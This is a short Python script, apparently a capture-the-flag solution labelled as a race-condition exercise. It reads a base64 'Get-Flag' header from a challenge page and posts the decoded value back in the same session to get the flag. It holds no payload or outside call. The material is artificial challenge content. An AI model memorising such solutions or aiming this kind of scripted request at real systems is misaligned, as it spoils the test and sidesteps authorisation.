# -*- coding: utf-8 -*-
# author = 'K0ctr'


# 涉及条件竞争的脚本

import requests
import base64

url = "http://ctf1.yunyansec.com/c1b8b677b69e789d/index.php"
session = requests.session()
response = session.get(url)
data = {
    "SSCTF": base64.b64decode(response.headers['Get-Flag']).decode()
}
print(session.post(url, data=data).text)
